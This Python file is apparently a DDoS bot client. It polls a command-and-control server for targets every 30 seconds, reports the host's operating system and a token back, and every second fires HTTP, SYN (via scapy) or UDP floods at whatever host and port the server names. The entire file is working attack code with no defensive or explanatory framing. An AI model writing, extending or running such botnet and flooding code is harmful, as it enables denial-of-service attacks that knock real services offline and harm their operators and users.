from scapy.all import *
import socket
import random
import requests
import json
from threading import Timer
import platform

base_url = None
user_token = None

api = {'httpFlood': False,'synFlood': False,'udpFlood': False}

def host_monitor():
    req = requests.get(base_url + '/api/command').json()
    if (req['code'] != 200):
        requests.get(base_url + '/api/callback', headers={'os': platform.system(), 'token': user_token})
    else:
        api['httpFlood'] = req['message']['httpFlood']
        api['synFlood'] = req['message']['synFlood']
        api['udpFlood'] = req['message']['udpFlood']
    Timer(30, host_monitor).start()
host_monitor()

def ddos():
    print(api)
    if api['httpFlood'] != False:
        requests.get(api['httpFlood'])
    else:
        if api['synFlood'] != False:
            send(IP(dst=api['synFlood'].split(':')[0]) / TCP(sport=RandShort(), dport=int(api['synFlood'].split(':')[1]), flags="S") / Raw(b"X"*1024), verbose=0)
        else:
            if api['udpFlood'] != False:
                udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
                udp.sendto(random._urandom(65500), (api['udpFlood'].split(':')[0], int(api['udpFlood'].split(':')[1])))
                udp.sendto(("X" * 1472).encode(), (api['udpFlood'].split(':')[0], int(api['udpFlood'].split(':')[1])))
    Timer(1, ddos).start()
ddos()
